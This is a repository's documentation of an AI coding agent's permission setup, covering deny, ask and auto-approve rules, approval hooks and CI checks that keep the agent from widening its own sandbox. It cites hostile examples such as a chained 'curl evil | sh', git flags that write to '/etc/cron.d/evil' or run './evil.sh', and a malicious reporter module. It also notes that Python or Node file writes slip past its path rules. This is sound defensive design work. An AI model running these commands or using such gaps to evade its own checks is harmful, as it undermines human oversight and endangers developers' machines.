# Agent Sandbox & Off-Limits Config

> **Last updated:** 2026-09-23

This file explains the permission posture committed in `.claude/settings.json`:
what an autonomous agent (Claude Code) is auto-allowed to run, what it is
hard-blocked from touching, what it must stop and ask a human before editing, and
how a human changes any of it. Read this if a tool call was unexpectedly
**denied**, unexpectedly **prompted**, or unexpectedly **auto-approved**.

`.claude/hooks/__tests__/settings-permissions.test.sh` derives the governed files
from `settings.json` and fails unless each one has a table row below, under the
heading for its kind, and is named in CONTRIBUTING.md's pointer row for this file.

## One off-limits file (hard-blocked, not prompted)

The `permissions.deny` block declares one protected file path:

| File | Why it is off-limits |
|------|----------------------|
| `.claude/settings.json` | It defines the agent's OWN permissions, hooks, and deny rules. Letting an agent edit it would let the agent widen its own sandbox — rules cannot constrain the thing that governs them. |

The effective path rule is `Edit(/.claude/settings.json)`, which covers file
edits and writes. The committed `Write(...)` companion is retained by the
repository tests, but current Claude Code does not consult Write path rules.
See [file permission rules](https://code.claude.com/docs/en/permissions#read-and-edit).

### How this file actually changes

A human edits it by hand, in a normal editor or via Claude Code's interactive
`/permissions` UI — neither path goes through the `Edit`/`Write` tools the deny
rule gates. CI re-checks the posture on every change with
`settings-permissions.test.sh`, and the Codex guard in `ci.yml` independently
rejects a permissive Codex profile whether or not any rule exists.

### If an agent legitimately needs it changed

The agent must surface the exact change it wants and
why, and let a human make the edit (or temporarily lift the rule via
`/permissions`). Widening the sandbox is a human decision recorded in a reviewable
diff — not something the agent can do mid-task.

## One ask-first file (explicit file-tool approval)

The `permissions.ask` block declares one file-tool approval path:

| File | Why it is ask-first |
|------|---------------------|
| `.codex/config.toml` | It declares the MCP servers a Codex session LAUNCHES. Every `[mcp_servers.*]` table is a `command` + `args` run on the developer's machine with the credentials named in its `env_vars`, so an edit there is code execution the next time someone starts Codex. It is not hard-blocked because it is hand-maintained (its server tables mirror `.mcp.json`), and a hard block made that maintenance impossible for an agent even with a human watching. |

It sat in `deny` beside `settings.json` until #10134 lifted that block for
maintainability. Lifting it outright left nothing between an agent's
`Edit`/`Write` and the Codex launch path until CI ran, so it is `ask` instead.
What `ask` means, per Claude Code's permission docs
([permissions](https://code.claude.com/docs/en/permissions),
[permission modes](https://code.claude.com/docs/en/permission-modes)):

- Rules are evaluated deny, then ask, then allow — so no `allow` rule can
  pre-approve an edit to this file.
- An explicit ask rule is on the list of "actions no mode auto-approves": it
  prompts in manual, `acceptEdits`, `auto` **and** `bypassPermissions` mode. An
  unattended `-p` run denies the call instead of prompting.
- The person approving sees the proposed edit, so a changed `command`, `args` or
  `env` is in front of a human before it is on disk.

`Edit(/.codex/config.toml)` supplies the effective path rule; its committed
`Write(...)` companion is not consulted by current Claude Code.

### How this file actually changes

A human edits it in a normal editor, or approves an agent's `Edit`/`Write` when
Claude Code prompts. Either way the change then has to pass the CI checks below.

What it does NOT cover, stated plainly:

- **Shell writes.** File-tool ask rules do not guarantee approval of every
  shell write. Read/Edit deny rules cover recognized commands such as `sed`
  and `tee` and redirect targets. Arbitrary Python/Node file writes can bypass
  those path checks; use an OS sandbox for process-wide enforcement.
- **Other writers.** Claude rules do not govern Codex or human editors. Codex
  has its own sandbox and approval controls, described below.

Behind every writer, at CI and at push time:

- **Its dangerous PROFILE** — `scripts/check-codex-config-safety.sh` in CI rejects
  a committed `approval_policy = "never"` together with `network_access = true`,
  whoever wrote it.
- **Drift from `.mcp.json`** — `tools/agentic-sync/port.mjs --check` requires the
  same server names, each with the exact `command` and `args` of its `.mcp.json`
  entry and every `${VAR}` secret forwarded by name in `env_vars`. It also fails a
  server whose own table does not set `default_tools_approval_mode = "prompt"`,
  and a `command`, arg or `cwd` that is a relative path, because Codex resolves
  those against the directory the session started in. Secret aliases and literal
  overrides of forwarded secrets are rejected; override keys are compared
  case-insensitively to cover Windows. It does not compare other server options
  or unrelated extra `env` entries; the prompt above and PR review see those.
- **Secret-shaped CONTENT** — GitHub secret-scanning push protection, enabled
  repo-wide, rejects a recognised credential at push time for every file and every
  actor. Verify with
  `gh api repos/Tristan578/project-forge --jq .security_and_analysis`. It matches
  KNOWN provider patterns, so an arbitrary internal credential with no
  recognisable shape is not caught by it.

## Codex sessions

The project profile uses `approval_policy = "on-request"` and explicit
`sandbox_mode = "workspace-write"`; it has no unsupported `allow = ["**/*"]`
setting. Each MCP server retains `default_tools_approval_mode = "prompt"`.
The default workspace-write policy protects `.codex` even inside a writable
checkout. Explicit host/user filesystem rules can override that default; this
project profile does not do so. See the [Codex permission implementation and
regression test](https://github.com/openai/codex/blob/8f1490eabe3ec27e92c46fd1b10400be3c910581/codex-rs/protocol/src/permissions.rs#L3277-L3307).

Headless `codex exec` cannot display an interactive approval prompt. For an
unattended job, supply narrowly scoped explicit tool approvals through its
host/configuration, or use an interactive session for the operation. Do not
replace the project defaults with blanket approval to make the job pass.

## What IS auto-approved (two complementary layers)

Safe read/build/test commands are auto-approved so the agent does not stop to ask
for routine work. Two layers cooperate, and the split between them is deliberate:
a native `permissions.allow` prefix rule is **flag-blind** — `Bash(git diff:*)`
matches `git diff HEAD` and `git diff --output=/etc/cron.d/evil` (arbitrary file
write) and `git diff -x ./evil.sh` (runs an arbitrary program) alike. So a command
goes on the static fast-path **only if it is safe with ANY argument**; everything
whose danger lives in a *flag* is handled by the hook, which can inspect flags.

1. **Static `permissions.allow`** — Claude Code's native fast-path. Restricted to
   commands that cannot be weaponized by an argument: `npm ci`/`install`/`run`/
   `test` (build/test — they run the project's own trusted package scripts),
   `npm ls` (a pure read), and `git status`/`rev-parse` (pure reads).
   Prefix rules (`Bash(npm ci:*)`) match the command and its arguments. Notably
   ABSENT, and intentionally so: `git diff`/`log`/`show` and `cargo check` (their
   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs), the
   `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config`/`--reporter`/
   `--format`/`-f` load a file that is itself executable code), and `npm audit`
   (bare `npm audit` is a read, but a prefix rule is subcommand-blind and would
   auto-approve `npm audit fix`, which runs `npm install` lifecycle scripts and
   rewrites the lockfile). Those are safe in their everyday form but flag- or
   subcommand-sensitive, so they live in the flag-aware hook instead — never on the
   blunt fast-path. This keeps the static list safe regardless of how the hook
   behaves.

2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — the
   comprehensive flag-aware layer. It auto-approves the flag-sensitive build/read
   tools the static list omits (`git diff`/`log`/`show`, `cargo check`, `npx
   vitest`/`eslint`/`tsc`/`playwright`) **in their safe form**, plus commands the
   static list never enumerates (`npx @axe-core/cli`, `npx @axe-core/reporter`,
   `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`,
   `npm audit` and `npm audit --<flag>` — but NOT `npm audit fix`). It
   emits `allow` for a known-safe SINGLE command. For other commands it emits
   `ask`, except in `bypassPermissions`, `dontAsk`, or `auto`, where it emits no
   decision and the session mode decides. Empty or unparseable input also
   defers without a decision. It always exits 0. Two gates run before the
   allow-list:
   - **Operator gate** — refuses any compound, piped, redirected, substituted,
     variable-expanded, or multi-line command even when the leading token is safe
     (`npm ci && curl evil | sh` prefix-matches `npm ci`).
   - **Flag gate** — refuses any command carrying a program-execution, file-write,
     or module-loading flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
     `--exec`/`--upload-pack`/`--receive-pack`, and `--reporter` — vitest/playwright
     `import()` a reporter module). The gate is value-blind: it cannot tell a builtin
     `--reporter=verbose` from `--reporter=./pwn.js`, so even the harmless builtin
     form defers to a prompt — a deliberate, low-frequency cost. eslint's `--format`/`-f` load a formatter module
     the same way and are gated WITHIN `npx` only: `git log --format=...` is a benign
     pretty-print string and `npm install -f` means `--force`, so a global gate
     would wrongly defer those. These need no shell operator, so the operator gate
     never sees them — the flag itself is the payload.

   Its allow-list and exact allow/ask/defer contract are pinned by
   `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.

Deliberately NOT auto-approved by either layer (the hook asks or defers as
described above):
`git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
-d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
`package.json`; only `npm pkg get` is auto-approved), `npm audit fix` (runs
`npm install` lifecycle scripts and rewrites the lockfile; only the read forms
`npm audit` / `npm audit --<flag>` are auto-approved), `npm exec` (runs arbitrary
package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
`generate` writes migration files).

These layers do not promise a prompt in every session. For an unlisted command,
the hook asks in ordinary interactive modes, but defers in `bypassPermissions`,
`dontAsk`, and `auto`. The host then applies its own permissions; it can allow or
deny without a human prompt.
